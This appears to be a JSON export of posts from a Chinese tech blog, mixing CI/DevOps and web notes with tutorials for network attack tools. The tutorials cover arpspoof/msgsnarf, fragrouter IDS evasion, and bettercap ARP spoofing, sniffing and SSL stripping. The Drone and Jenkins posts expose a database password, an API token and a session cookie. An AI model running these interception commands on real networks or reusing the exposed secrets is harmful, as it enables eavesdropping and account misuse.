3128]\n\n它能捕获受害者访问网站的详细信息。你可以试试msgsnarf捕获即时聊天会话信息，我的意思是如果用户通过雅虎聊天或者任何IRC频道，通过msgsnarf可以捕获受害者所有的谈话，结束攻击需要结束arpspoof。\n\nroot@bt:~# killall arpspoof\n################################################################################\n0x00 fragrouter介绍\n\nfragrouter是一个具有路由器功能的应用程序，它能够对攻击者发送的攻击流量进行分片处理之后，向攻击目标转发。\n\n0x01 fragrouter功能\n\nfragrouter - 入侵检测系统(IDS)逃避工具包\n\nroot@kali:~# fragrouter\n版本：1.6\n用法：fragrouter [-i interface] [-p] [-g hop] [-G hopcount] ATTACK\n\n其中ATTACK是以下之一：\n\n-B1：base-1：正常的IP转发\n-F1：frag-1：有序的8字节IP分片\n-F2：frag-2：有序的24字节IP分片\n-F3：frag-3：有序的8字节IP分片，一个失序\n-F4：frag-4：有序的8字节IP分片，一个重复\n-F5：frag-5：无序的8字节片段，一个重复\n-F6：frag-6：有序的8字节片段，标记最后一个Frag\n-F7：frag-7：有序的16字节片段，fwd重写\n-T1：tcp-1：3-whs，错误TCP校验和和FIN/RST，有序的1字节段\n-T3：tcp-3：3-whs，有序的1字节段，一个重复\n-T4：tcp-4：3-whs，有序的1字节段，一次重写\n-T5：tcp-5：3-whs，有序的2字节段，fwd重写\n-T7：tcp-7：3-whs，有序的1字节段，交织空段\n-T8：tcp-8：3-whs，有序的1字节段，一个失序\n-T9：tcp-9：3-whs，无序的1字节段\n-C2：tcbc-2：3-whs，有序的1字节段，交织的SYN\n-C3：tcbc-3：有序的1字节空段，3-whs，有序的1字节段\n-R1：tcbt-1：3-whs，RST，3-whs，有序的1字节段\n-I2：ins-2：3-whs，有序的1字节段，错误TCP校验和\n-I3：ins-3：3-whs，有序的1字节段，不设置ACK\n-M1：misc-1：Windows NT 4 SP2 - http://www.dataprotect.com/ntfrag/\n-M2：misc-2：Linux IP chain - http://www.dataprotect.com/ipchains/\n0x02 fragrouter用法示例\nfragrouter -i eth0 -F1","tags":null},{"location":"//blog.pytool.com/Post/drone/2016-10-04 Drone_java","title":"drone_java","text":"matrix:\n  include:\n    WORKDIR: work\n      SSHHOST: b1.linyicn.com\n      SSHPORT: 22\n      DBHOST: 123.56.199.52\n      DBPORT: 3306\n      DBDATABASE: notes\n      DBUSER: notes\n      DBPASSWORD: tz3MW8AfCvj14aZ\n      HTTPPORT: 10000\n      TARGETDIR: /docker/tomcat/webapps/\n\nworkspace:\n  base: /go\n  path: src/${DRONEREPOLINK:6}\n\nclone:\n  git:\n    image: plugins/git\n    volumes:\n      /docker/src:/go/src\n\npipeline:\n  maven:\n    image: maven\n    group: ${DRONEBRANCH}\n    volumes:\n      /root/.m2:/root/.m2\n      /docker/src:/go/src\n    commands:\n      mvn clean package -P${DRONEBRANCH}\n\n  rsync:\n    image: drillster/drone-rsync\n    volumes:\n      /docker/src:/go/src\n    hosts: ${SSHHOST}\n    port:  ${SSHPORT}\n    user:  root\n    # key: ${PLUGINKEY}\n    source: target/${DRONEREPONAME}/\n    # target: /docker/${DRONEREPO}/${DRONEBRANCH}/\n    # target: /docker/tomcat/webapps/${DRONEREPONAME}/\n    target: ${TARGETDIR}/${WORKDIR}\n    args: --rsync-path=\"mkdir -p ${TARGETDIR}/${WORKDIR}/ \u0026\u0026 rsync\"\n    # include:\n    #   - \"app.tar.gz\"\n    #   - \"app.tar.gz.md5\"\n    exclude:\n      # - \"*.\"\n      \"upload\"\n      \"uploads\"\n    recursive: true\n    delete: true\n    script:\n      # 这里脚本是在远程机器/root目录上执行\n      # - sed -i -e \"s|^jdbc.url=jdbc:mysql.|jdbc.url=jdbc:mysql://${DBHOST}:${DBPORT}/${DBDATABASE}?useUnicode=true\\\u0026characterEncoding=UTF-8|g\"\n      #          -e \"s|^jdbc.username=.|jdbc.username=${DBUSER}|g\"\n      #          -e \"s|^jdbc.password=.*|jdbc.password=${DBPASSWORD}|g\" ${TARGETDIR}/${WORKDIR}/WEB-INF/classes/jeesite.properties\n      # - if [ -f /docker/tomcat/webapps/upgrade.sh ] ;then bash /docker/tomcat/webapps/upgrade.sh; fi\n      # - mkdir -p ${TARGETDIR}/ROOT/; echo 'script language=\"javascript\" window.location = \"/${WORKDIR}/\"; /script'   ${TARGETDIR}/ROOT/index.html\n      true; docker rm -f tomcat ; docker run --restart=always -d --name tomcat -p ${HTTPPORT}:8080 --link mariadb:mysql --add-host=\"docker0:${DBHOST}\"\n               -v /docker/tomcat/webapps/:/usr/local/tomcat/webapps/ -v /docker/tomcat/logs:/usr/local/tomcat/logs  rinetd/tomcat:8.5\n    secrets: [ RSYNCKEY,PLUGINKEY ]\n\n  # upgrademysqllybb:\n  #   image: rinetd/drone-mysql\n  #   group: ${DRONEBRANCH}\n  #   volumes:\n  #     - /docker/src:/go/src\n  #   hosts:\n  #     - ${DBHOST}\n  #   port:  ${DBPORT}\n  #   user:  ${DBUSER}\n  #   password: ${DBPASSWORD}\n  #   database: ${DBDATABASE}\n\n  # ssh:\n  #   image: appleboy/drone-ssh\n  #   group: ${DRONEBRANCH}\n  #   volumes:\n  #     - /docker/src:/go/src\n  #   host: ${SSHHOST}\n  #   port: ${SSHPORT}\n  #   # username: root\n  #   # password: ${SSHPASSWORD}\n  #   # ssh-key: ${SSHKEY}\n  #   script:\n  #     - mkdir -p ${TARGETDIR}/ROOT/; echo 'script language=\"javascript\" window.location = \"/${WORKDIR}/\"; /script'   ${TARGETDIR}/ROOT//index.html\n  #   secrets: [ SSHKEY,PLUGINKEY ]\n\n # drone secret add --repository bianban/lybb --name PLUGINKEY --value @/home/ubuntu/.ssh/idrsa\n\nbranches: ${BRANCHNAME}\n`","tags":null},{"location":"//blog.pytool.com/Post/Android 应用/2016-01-10 Android应用开发 环境搭建","title":"Android应用开发环境搭建","text":"---\nGoogle Java编程风格指南\n移动应用开发必备工具盘点\n云服务提供商\nUCloud\n\nBmob\n个推\n极光推送\n\nLeanCloud\n\nFir.im\nIT性能监控神器\nTestin云测\nBugHD\n\n短信验证码\n\n代码库\ncode4app\n\n 优秀开源软件\n云适配","tags":null},{"location":"//blog.pytool.com/Hacker/02_欺骗嗅探/2016-03-29 Etherwall","title":"Etherwall","text":"Etherwall是一款免费且开源的网络安全工具，可以有效防御通过ARP Spoofing/Poisoning进行的中间人攻击(MITM)。同时它也可以防御其他不同类型的攻击，如Sniffing, Hijacking, Netcut, DHCP Spoofing, DNS Spoofing, WEB Spoofing等。\n\n\t主要特点\n\n1.守护进程处理\n2.ARP包过滤\n3.提供点对点/点对多点防御\n4.实时防御\n5.支持以太网和无线网\n6.易于使用并且免费","tags":null},{"location":"//blog.pytool.com/Post/Android 应用/2016-01-14 Android应用 Root权限","title":"Android应用请求获取Root权限","text":"Android应用请求获取Root权限\n\n要让Android应用获得Root权限，首先Android设备必须已经获得Root权限。\n应用获取Root权限的原理：让应用的代码执行目录获取最高权限。在Linux中通过chmod 777 [代码执行目录]\n/*\n 应用程序运行命令获取 Root权限，设备必须已破解(获得ROOT权限)\n  @return 应用程序是/否获取Root权限\n */  \npublic static boolean upgradeRootPermission(String pkgCodePath) {  \n    Process process = null;  \n    DataOutputStream os = null;  \n    try {  \n        String cmd=\"chmod 777 \" + pkgCodePath;  \n        process = Runtime.getRuntime().exec(\"su\"); //切换到root帐号  \n        os = new DataOutputStream(process.getOutputStream());  \n        os.writeBytes(cmd + \"\\n\");  \n        os.writeBytes(\"exit\\n\");  \n        os.flush();  \n        process.waitFor();  \n    } catch (Exception e) {  \n        return false;  \n    } finally {  \n        try {  \n            if (os != null) {  \n                os.close();  \n            }  \n            process.destroy();  \n        } catch (Exception e) {  \n        }  \n    }  \n    return true;  \n}\n@Override  \npublic void onCreate(Bundle savedInstanceState) {  \n    super.onCreate(savedInstanceState);  \n    setContentView(R.layout.main);  \n    //当前应用的代码执行目录  \n    upgradeRootPermission(getPackageCodePath());  \n}\n`","tags":null},{"location":"//blog.pytool.com/Post/2016-06-01 Linux命令 Ruby","title":"ruby","text":"Ruby特殊变量：\n$: = default search path (array of paths)\n$. 解释器最近读的行数(line number)\n$! 最近一次的错误信息\n$@ 错误产生的位置\n$_ gets最近读的字符串\n$\u0026 最近一次与正则表达式匹配的字符串\n$~ 作为子表达式组的最近一次匹配\n$n 最近匹配的第n个子表达式(和$~[n]一样)\n$= 是否区别大小写的标志\n$/ 输入记录分隔符\n$\\ 输出记录分隔符\n$0 Ruby脚本的文件名\n$ 命令行参数\n$$ 解释器进程ID\n$? 最近一次执行的子进程退出状态\n\n1\n\nYoung \n\nubuntu 14.04中安装 ruby on rails 环境（填坑版） 呕血推荐\n\n1.版本管理器工具:rvm\n1、安装RVM\nRVM 安装\n RVM\ncurl -sSL https://get.rvm.io | bash -s stable\n [[ -d \"$HOME/.rvm\" ]] \u0026\u0026 export PATH=\"$PATH:$HOME/.rvm/bin\" # Add RVM to PATH for scripting\n\ngit clone --depth 1 https://github.com/rvm/rvm.git  ~/.rvm\n[[ -s \"$HOME/.rvm/scripts/rvm\" ]] \u0026\u0026 source \"$HOME/.rvm/scripts/rvm\"  Load RVM into a shell session as a function*\n\n安装RVM的环境依赖\n rvm requirements\n\nRuby 的安装与切换\nrvm list\nrvm list known\nrvm install 2.2.0\nrvm use 2.2.0\nrvm use 2.2.0 --default\nrvm remove 1.8.7\nrvm use system\n2、安装Ruby\n修改 RVM 的 Ruby 安装源到国内的 淘宝镜像服务器，这样能提高安装速度\nsed -i -E 's!https?://cache.ruby-lang.org/pub/ruby!https://ruby.taobao.org/mirrors/ruby!' ~/.rvm/config/db\n\nmkdir .nvm/rubies .nvm/archives .rvm/user\nrvm install ruby\n如果想在Ubuntu上安装多个Ruby版本，那么可以使用下面的命令来指定使用rvm作为默认的Ruby版本管理。\nrvm use ruby --default\n\n 3. 包管理工具:RubyGems\nRubyGems 镜像\ngem update --system #更新RubyGems   2.6x\ngem sources --add https://gems.ruby-china.org/ --remove https://rubygems.org/\ngem sources -l # 查看当前使用的镜像\n\nbundle config mirror.https://rubygems.org https://gems.ruby-china.org\n`","tags":null},{"location":"//blog.pytool.com/Post/drone/2016-10-04 Drone自定义clone","title":"drone自定义clone","text":"http://readme.drone.io/questions/how-to-customize-the-clone-stage/\nhttp://readme.drone.io/0.5/usage/customize-clone/\nhttps://github.com/drone-plugins/drone-git/blob/master/DOCS.md\n\nmatrix:\n  include:\n    REPOURL: \"git.yimengapp.com\"\n      LOCALVOLUME: \"/var/www/yimeng\"\npipeline:\n  clone:\n    image: plugins/git\n    volumes:\n      ${LOCALVOLUME}/master:/drone/src/${REPOURL}/${DRONEREPO}\n    when:\n      branch: master\n\n  clone:\n    image: plugins/git\n    volumes:\n      ${LOCALVOLUME}/release:/drone/src/${REPOURL}/${DRONEREPO}\n    when:\n      branch: release\n\n  clone:\n    image: plugins/git\n    volumes:\n      ${LOCALVOLUME}/develop:/drone/src/${REPOURL}/${DRONEREPO}\n    when:\n      branch: [ dev, develop ]\n\n  busybox:\n    image: busybox\n    volumes:\n      ${LOCALVOLUME}/:${LOCALVOLUME}\n    commands:\n      if [ ${DRONEBRANCH} == master ]; then chown -R 33:33 ${LOCALVOLUME}/master ; fi\n      if [ ${DRONEBRANCH} == release ]; then chown -R 33:33 ${LOCALVOLUME}/release ; fi\n      if [ ${DRONEBRANCH} == develop ]; then chown -R 33:33 ${LOCAL_VOLUME}/develop ; fi\nvolumes:必须加 否则依然挂载主机工作目录默认为 /drone，\nworkspace:\n  base: /go     # 绝对路径 默认为 /drone\n  path: src/github.com/octocat/hello-world #相对路径 配合base拼接出项目下载的绝对地址\n  因为 workspace为docker创建的目录，所以必须手动挂载volume去覆盖内部的，才能做到目录共享\n工作原理:\n\ndrone 根据workspace在docker中创建volume 工作目录，其他stage共享此volume 结束后销毁\n在clone 阶段 手工指定volumes 覆盖 系统创建的工作目录\n因为其他stage共享系统创建的volume 因此手工指定的volumes并不共享，因此如果想要使用的话依然需要显示volumes：\n\nclone 阶段是pipeline 第一个阶段\n跳过clone\n跳过clone 有两种解决方案：\n全局跳过 这种方式解决的比较彻底，但还是会带来一次构建\npipeline:\n  clone:\n    image: busybox\n    commands: ls /\n    volumes: /tmp:/tmp\n将你需要执行的stage 添加到clone：下即可，但是如果添加条件支持的话 需要添加多个step clone:标签\n注意: step标签名必须为clone:\npipeline:\n  clone:\n    image: plugins/ssh\n    host: [ qubuluo.com ]\n    user: root\n    port: 22\n    script:\n      echo master   master.txt\n      echo master\n    when:\n      branch: master\n  clone:\n    image: plugins/ssh\n    host: [ qubuluo.com ]\n    user: root\n    port: 22\n    script:\n      echo dev   dev.txt\n      echo dev\n    when:\n      branch: dev\n\n 为clone 增加缓存\n开启Trusted  # drone exec --repo.trusted\n创建自定义Dockerfile 镜像\nFROM plugins/git\nVOLUME /drone\ndocker build -t rinetd/drone-git \u0026\u0026 docker push rinetd/drone-git\n\n创建自定义 clone stage\n volumes：/drone:/drone\npipeline:\n  clone:\n    image: rinetd/drone-git\n    volumes: /drone:/drone\n\ndrone agent 以 root 权限运行 否则没有文件写入权限\n  或者 /drone 目录必须权限必须更改为agent运行用户\n\nDrone automatically prepends a clone step to your Yaml file if one does not already exist. You can manually configure the clone step in your pipeline for customization:\n\npipeline:\nclone:\nimage: plugins/git\n\nExample configuration to override depth:\n\npipeline:\n  clone:\n    image: plugins/git\ndepth: 50\n\nExample configuration to use a custom clone plugin:\n\npipeline:\n  clone:\nimage: octocat/custom-git-plugin","tags":null},{"location":"//blog.pytool.com/Post/前端技术/CSS十日谈/2014-01-03-the-tenth-day-talk-about-white-space","title":"第十天，谈谈【white-space】","text":"---\n\nwhite-space 属性用来描述元素该如何处理内部的空白。DEMO\n\n假设，我们有下面的HTML，代码一：\n\ndiv\n\ta bunch of words you see\n/div\n\n我们把上面 div 的宽度设置为 100px。在正常字体下，100px 宽度不能容纳这么多文本。默认情况下： white-space 值为 normal，因此容器会包裹文本。如下图：\n\n如果想阻止容器包裹文本，使用 white-space:nowrap。如下图：\n\n如果你仔细看代码一，注意到其实包含两个换行，一个在文本行之前，一个在其之后。当浏览器渲染这段代码时，这些换行看起来就像被去除了一样。同时被去除的还有第一个字母之前的空白。如果想要浏览器展示这些换行和空白，可以使用 white-space:pre;，如下图：\n\n把它叫做 pre，是因为它的行为就像把文本包裹在 pre/pre 标签中一样。空白会被保留与HTML代码保持一致，文本会保持在一行中，直到代码中出现换行。这在展示代码片段时很有用。\n\npre 等标签的浏览器默认的样式如下：\n\npre, xmp, plaintext, listing {\n    display: block;\n    font-family: monospace;\n    white-space: pre;\n    margin: 1em 0px;\n}\n\n假如，你想保留类似 pre 的处理空白和换行的方式，但是又需要文本换行而不是超出父容器。这就要使用 white-space:pre-wrap。如下图：\n\n最后，white-space:pre-line； 会在代码中换行处换行，但是会去除空白。如下图：\n\n有意思的是：最后一个换行被去除了。\n\n在 CSS 2.1 规范中是这样说的：\n\n  Lines are broken at preserved newline characters, and as necessary to fill line boxes.\n\n下面的表格可以帮助你理解不同属性值的行为：\n\n \u0026nbsp;|新行|空白与tab|包裹文本","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 nginx 列目录","title":"Linux命令 Nginx列出目录 autoindex","text":"列出目录 autoindex\n\nNginx默认是不允许列出整个目录的。如需此功能，打开nginx.conf文件，在location，server 或 http段中加入autoindex on;，另外两个参数最好也加上去:\n\nautoindexexactsize off\n\n默认为on，显示出文件的确切大小，单位是bytes。改为off后，显示出文件的大概大小，单位是kB或者MB或者GB\n\nautoindexlocaltime on\n\n默认为off，显示的文件时间为GMT时间。改为on后，显示的文件时间为文件的服务器时间\n\nlocation /images {\n  root   /var/www/nginx-default/images;\n  autoindex on;\n  autoindexexactsize off;\n  autoindexlocaltime on;\n}\n\n1.目录列表(directory listing)\n\nnginx让目录中的文件以列表的形式展现只需要一条指令\n\nautoindex on;\n\nautoindex可以放在location中，只对当前location的目录起作用。你也可以将它放在server指令块则对整个站点都起作用。或者放到http指令块，则对所有站点都生效。\n\n下面是一个简单的例子:\nserver {\n        listen   80;\n        servername  domain.com www.domain.com;\n        accesslog  /var/...........................;\n        root   /path/to/root;\n        location / {\n                index  index.php index.html index.htm;\n        }\n        location /somedir {\n               autoindex on;\n        }\n}\n\n2.nginx禁止访问某个目录\n\n跟Apache的Deny from all类似，nginx有deny all指令来实现。\n\n禁止对叫dirdeny目录的访问并返回403 Forbidden，可以使用下面的配置:\nlocation /dirdeny {\n      deny all;\n      return 403;\n}","tags":null},{"location":"//blog.pytool.com/Post/drone/2016-10-04 jenkins","title":"jenkins","text":"docker + jenkins + git + maven自动化构建与部署\n持续集成Jenkins API常见用法\n最佳实战Docker持续集成图文详解\n从零开始搭建 Jenkins+Docker 自动化集成环境 \n创建Jenkins服务\nssh root@qubuluo.com\nmkdir $HOME/jenkins \nsudo chown 1000:1000 $HOME/jenkins\ndocker run --rm --name jenkins -p 8080:8080 -p 50000:50000 -v $HOME/jenkins:/var/jenkinshome -v /var/run/docker.sock:/var/run/docker.sock jenkins\n\n生成 admin 密码\nJenkins initial setup is required. An admin user has been created and a password generated.\nPlease use the following password to proceed to installation:\nb51312a975c943218c4bc814dae97632\nThis may also be found at: /var/jenkinshome/secrets/initialAdminPassword\n安装插件\n创建管理用户\nCreate First Admin User\nrinetd  sd\n\n安装blueocean UI\nhttps://jenkins.io/projects/blueocean/#use-the-beta\n\n无参 编译\nJENKINSURL/job/JOBNAME/build?token=TOKEN where TOKEN is set up in the job configuration.\ncurl http://qubuluo.com:8080/job/yimeng/build?token=ae9ed2024d4a27d066b3c8009e77857a\n\nCRUMB=$(curl -s 'http://rinetd:ae9ed2024d4a27d066b3c8009e77857a@qubuluo.com:8080/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,\":\",//crumb)')\ncurl -H $CRUMB http://USER:TOKEN@localhost:8080/jobname/disable\ncurl -H $CRUMB http://localhost:8080/jobname/disable -u USER:TOKEN\n\n开箱即用的Jenkins镜像\n如何使用镜像\n\nconsole\n$ docker run -p 8080:8080 index.csphere.cn/microimages/jenkins\n\n这样启动将会把所有workspace存储到 /var/jenkinshome 目录，包括所有数据、插件以及配置，你也许希望运行在一个持久化的数据卷里:\n\nconsole\n$ docker run --name myjenkins -p 8080:8080 -v /var/jenkinshome index.csphere.cn/microimages/jenkins\n\nmyjenkins这个容器里的卷将会得到持久化，你也可以映射一个主机目录:\n\nconsole\n$ sudo chown 999 /your/home\n$ docker run -p 8080:8080 -p 50000:50000 -v /your/home:/var/jenkinshome index.csphere.cn/microimages/jenkins\n\njenkins管理员用户\njenkins镜像启动后，打开浏览器 http://your-ip:8080 , 会提示输入用户名密码，这里默认用户名admin，密码admin。进入后在 用户 菜单里修改密码。\n如何和docker结合\ndocker最大的优势在于部署，jenkins最强大的在于作业调度和插件系统，如何结合两者？\n\njenkins镜像里内置了docker client命令行工具，/usr/bin/docker，因此我们只需要传递 DOCKERHOST 环境变量 或者映射 docker.sock 文件给jenkins容器，就可以让jenkins容器里面拥有docker的操作能力，进而将两者结合起来。\n\n比如：\n\ndocker run -p 8080:8080 -p 50000:50000 -v /your/home:/var/jenkinshome -v /var/run/docker.sock:/var/run/docker.sock index.csphere.cn/microimages/jenkins\n\n然后我们就可以在自己的jenkins项目中，添加一个执行shell脚本，示例如下：\n\nTAG=$(echo $GITCOMMIT | awk  '{ string=substr($0, 1, 7); print string; }' )\ndocker build -t demo:$TAG .\ndocker run --rm demo:$TAG runtest\ndocker tag -f demo:$TAG yourregistry/demo:$TAG\ndocker push yourregistry/demo:$TAG\n\n备份数据\n如果你挂载了主机目录到容器内，那么备份该目录即可。这也是我们推荐的方法。将 /var/jenkinshome 目录看作数据库目录。\n\n如果你的卷在容器里面，那么可以通过 docker cp $ID:/var/jenkinshome 命令拷贝出数据。\n\n如果对docker数据管理有兴趣，可以阅读 Managing data in containers。\n设置执行器的数量\n你可以通过groovy脚本来指定jenkins master执行器的数量。默认是2个，但你可以扩展镜像:\n\nexecutors.groovy\nJenkins.instance.setNumExecutors(5)\n\n和 Dockerfile\n\nFROM index.csphere.cn/microimages/jenkins\nCOPY executors.groovy /usr/share/jenkins/ref/init.groovy.d/executors.groovy\n\n构建executors\n你可以在master上构建，但如果想在slave上构建的话，必须做好50000端口映射，这是用来连接slave agent的。\n传递JVM参数\n你也许想修改JVM的运行参数，比如heap memory:\n\n$ docker run --name myjenkins -p 8080:8080 -p 50000:50000 --env JAVAOPTS=-Dhudson.footerURL=http://mycompany.com index.csphere.cn/microimages/jenkins\n\n配置日志\nJenkins的日志可以通过 java.util.logging.config.file Java property来配置\n\nconsole\n$ mkdir data\n$ cat   data/log.properties \u003c","tags":null},{"location":"//blog.pytool.com/Hacker/02_欺骗嗅探/2016-03-29 bettercap","title":"ettercap","text":"bettercap是一个强大的,模块化的,方便并且容易扩展的中间人攻击框架。\n\n一些主要的功能如下:\n\n.支持全双工和半双工ARP欺骗。\n.第一次真正实现ICMP 双向欺骗。\n.可配置的DNS欺骗。\n.完全自动化,可实时发现主机。\n.实时获取通信协议中的安全凭证，包括HTTP(S)中的Post数据，Basic和Digest认证，FTP,IRC,POP,IMAP,SMTP,NTLM(HTTP,SMB,LDAP)以及更多\n.完全可定制的网络嗅探器。\n.模块化的HTTP和HTTPS透明代理,支持用户自定义插件或内置插件，注入到目标的HTML代码、JS、CSS文件，以及URL中。\n.使用HSTS bypass技术拆封SSL。\n.内置式的HTTP服务器。\n\n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n\n以上都是胡扯,框架好不好,用了才知道.\n0x01:安装(Kali 2.0平台)\n\n以下方法都已在Kali 2.0 平台亲测,请在安装前确保主机可以正常联网\n\n方法一:(推荐) 安装稳定版\n\nroot@Kali:~# apt-get install build-essential ruby-dev libpcap-dev\nroot@Kali:~# gem sources --remove https://rubygems.org/\nroot@Kali:~# gem sources -a https://ruby.taobao.org/\nroot@Kali:~# gem install bettercap\n\n    1\n    2\n    3\n    4\n    5\n\n方法二:(不推荐) 安装最新版\n\nroot@Kali:~# git clone https://github.com/evilsocket/bettercap\nroot@Kali:~# cd bettercap/\nroot@Kali:~/bettercap# gem build bettercap.gemspec\nroot@Kali:~/bettercap# gem install bettercap.gem\nroot@Kali:~/bettercap# apt-get install build-essential ruby-dev libpcap-dev\nroot@Kali:~/bettercap# gem sources --remove https://rubygems.org/\nroot@Kali:~/bettercap# gem sources -a https://ruby.taobao.org/\nroot@Kali:~/bettercap# gem install bettercap.gem\n\n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n\n说明:\n推荐第一种方法安装bettercap,最保险,可以正常使用;\n第二种方法安装的bettercap在我的kali linux 2.0平台下可以打开,但无法正常使用;\n如果安装平台不是Kali,安装出错请查阅官方文档说明,官方地址见文章最后部分.\n0x02:使用方法:\n\n先查看当前工作的网卡接口的名称:如eth0,wlan0.\n\nroot@Kali:~# ifconfig\n或者\nroot@Kali:~# ip address\n\n    1\n    2\n    3\n\n然后，start ！\n\nroot@Kali:~# bettercap -I wlan0 -X\n或者\nroot@Kali:~# bettercap -I wlan0 --sniffer\n\n    1\n    2\n    3\n\n0x03:命令参数详解\n\n-h, --help                          使用帮助;\n-G, --gateway ADDRESS               手动指定网关地址,如果没有指定当前的网关,网关将被自动检索和使用;\n-I, --interface                     指定网络接口名，默认为eth0;\n-S, --spoofer NAME                  指定欺骗模块，此参数默认为ARP，支持ICMP与ARP,可设为None;\n-T, --target ADDRESS1,ADDRESS2      目标IP地址,如果没有将指定整个子网为目标,\n    --ignore ADDRESS1,ADDRESS2      寻找目标时,忽略指定的地址;\n-O, --log LOGFILE                  把所有消息记录到一个文件中,如果未指定则只打印到shell,\n    --log-timestamp                 启用日志记录每一行的时间戳,默认禁用;\n-D, --debug                         调试功能，会将每一步操作详细记录，便于调试;\n-L, --local                         解析流经本机的所有数据包（此操作会开启嗅探器），默认为关闭;\n-X, --sniffer                       开启嗅探器,\n    --sniffer-source FILE           加载指定的PCAP包文件,而不是使用接口(此操作将开启嗅探器),\n    --sniffer-pcap FILE             将数据包保存为指定的PCAP文件（此操作会开启嗅探器),\n    --sniffer-filter EXPRESSION     配置嗅探器使用BPF过滤器（此操作会开启嗅探器);\n-P, --parsers PARSERS               解析指定的数据包并用逗号分隔（此操作会开启嗅探器),支持\n    IRC, WHATSAPP, HTTPAUTH, HTTPS, MYSQL, POST, REDIS, DICT, COOKIE, NNTP,\n    MPD, SNMP, PGSQL, RLOGIN, NTLMSS, SNPP, URL, FTP, DHCP, MAIL, CREDITCARD.\n    --custom-parser EXPRESSION      使用正则表达式来捕获和显示嗅探的数据(此操作会开启嗅探器),\n    --silent                        如果不是警告或者错误消息,就不显示,默认关闭,\n    --no-discovery                  不主动寻找目标主机,只使用当前的ARP缓存,默认关闭,\n    --no-spoofing                   禁用欺骗,同--spoofer NONE命令,\n    --no-target-nbns                禁用NBNS主机名,\n    --half-duplex                   使用半双工模式,遇到大流量路由器时可以保证其正常工作,    \n    --proxy                         启用HTTP代理和重定向所有HTTP请求,默认关闭,          \n    --proxy-https                   启用HTTPS代理和重定向所有HTTPS请求,默认关闭,           \n    --proxy-port PORT               设置HTTP代理端口,默认为8080,     \n    --http-ports PORT1,PORT2        用逗号分隔需要重定向到代理的HTTP端口,默认为80,\n    --https-ports PORT1,PORT2       用逗号分隔需要重定向到代理的HTTPS端口,默认为443,\n    --proxy-https-port PORT         设置HTTPS代理端口,默认为8083,\n    --proxy-pem FILE                为HTTPS代理使用自定义PEM证书文件,默认文件为\n                                    /root/.bettercap/bettercap-ca.pem,\n    --proxy-module MODULE           要么加载Ruby代理模块,要么加载injectjs,\n                                    injectcss,injecthtml之一\n    --custom-proxy ADDRESS          使用一个自定义HTTP上游代理,而不是嵌入式的,   \n    --custom-proxy-port PORT        为自定义的HTTP上游代理指定一个端口,默认为8080,\n    --no-sslstrip                   禁用SSLStrip,\n    --custom-https-proxy ADDRESS    使用一个自定义HTTPS上游代理,而不是内置的,\n    --custom-https-proxy-port PORT  为自定义的HTTPS端口指定上游代理,默认为8083,\n    --custom-redirection RULE       使用自定义的端口重定向,格式是:\n    PROTOCOL ORIGINALPORT NEW_PORT. 例如:TCP 21 2100,重定向所有TCP流量，从端口21定向到端口2100.\n    --httpd                         启用HTTP服务器,默认关闭,\n    --httpd-port PORT               设置HTTP服务器端口,默认为8081,\n    --dns FILE                      使用DNS服务器文件作为解析表,\n    --dns-port PORT                 设置DNS服务器端口,默认为5300,\n    --httpd-path PATH               设置HTTP服务器路径,默认为:./,\n    --kill                          杀掉连接目标,不转发,\n    --packet-throttle NUMBER        设置要发送的每个数据包之间延迟的秒数,\n    --check-updates                 检查更新.\n\n0x04:使用实图\n\n使用姿势:\n\n其实后面可以加一个：-O /evil.log,将嗅探的信息保存到文件中，方便查看与分析\n使用方式\n\n自动的主机发现：\n\n主机好多。。。\n\n嗅探数据:\n\n嗅探出了小米的服务凭证\n0x05官方部分命令示例\n\n    Default sniffer mode, all parsers enabled:\n    sudo bettercap -X\n    Enable sniffer and load only specified parsers:\n    sudo bettercap -X -P “FTP,HTTPAUTH,MAIL,NTLMSS”\n    Enable sniffer and use a custom expression:\n    sudo bettercap -X –custom-parser “password”\n    Enable sniffer + all parsers and parse local traffic as well:\n    sudo bettercap -X -L\n    Enable sniffer + all parsers and also dump everything to a pcap file:\n    sudo bettercap –sniffer –sniffer-pcap=output.pcap\n    What about saving only HTTP traffic to that pcap file?\n    sudo bettercap –sniffer –sniffer-pcap=http.pcap –sniffer-filter “tcp and dst port 80”\n    Default ARP spoofing mode on the whole network without sniffing:\n    sudo bettercap\n\n0x06: 后记\n\n文章为原创,转载请注明博客出处地址;\n文章参考bettercap官网:https://bettercap.org 文档、freebuf http://www.freebuf.com/tools/99607.html和个人理解与整理创作而成,顺便感谢下有道翻译~","tags":null},{"location":"//blog.pytool.com/Post/Elastic/2016-10-04 Elastic 更新","title":"Elastic 更新","text":"6.0更新\nIndex templates now take an list for the template: field instead of a string.\n\nFor example:\n\n{\n  \"index_patterns\":  [\"c\", \"d\"],\n}\nInstead of the previous form\n\n{\n  \"template\": \"c*\"\n}\nTemplate metadata from older versions of ES are still openable with this code, although I don't know how important that is since it's probably assumed that you can't just open a new elasticsearch release on an old one's data directory and expect it to work.","tags":null},{"location":"//blog.pytool.com/Post/Android 应用/2016-01-11 Android应用开发 常用技巧","title":"Android应用开发","text":"---\n【Android 开发技巧】常见问题归纳——需要注意的坑和解决方案\n全戦之路\nAndroid总结篇系列：Android 权限\n安卓资源库列表\nfeisky Android","tags":null},{"location":"//blog.pytool.com/Post/drone/2016-10-04 Drone","title":"drone","text":"Error response from daemon: oci runtime error: containerlinux.go:247: starting container process caused \"chdir to cwd (\\\"/go/src/git.chinaoss.com/thinkphp5/jinbaiwei\\\") set in config.json failed: no such file or directory\"\n    volumes:\n      /docker/src/${DRONEREPOLINK:6}:/go/src/${DRONEREPOLINK:6}\n\n 修复drone 一直运行无法停止\n\n.tables             # 查表结构\n.schema  builds     #\ndelete from builds where buildstatus = \"running\";\nselect  from builds where buildid = 72;\n\ndrone 获取全部的 Repositories\ncurl -s  -b usersess=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1MDk3NjMzOTIsInRleHQiOiJyb290IiwidHlwZSI6InNlc3MifQ.m5anzfXUKAiqswbiSuz43TVx5xphZiHCc67QoFkEZYs http://drone.hangruan.cn/api/user/repos\\?all\\=true|jq '.[].fullname'\n\n-b 使用Cookie\n\n 命令使用\ndrone repo add thinkphp5/jinbaiwei                 # 启用项目\ndrone repo update --trusted thinkphp5/jinbaiwei    # 增加 privileged 权限\ndrone repo repair thinkphp5/jinbaiwei              # 增加webhooks repair repository 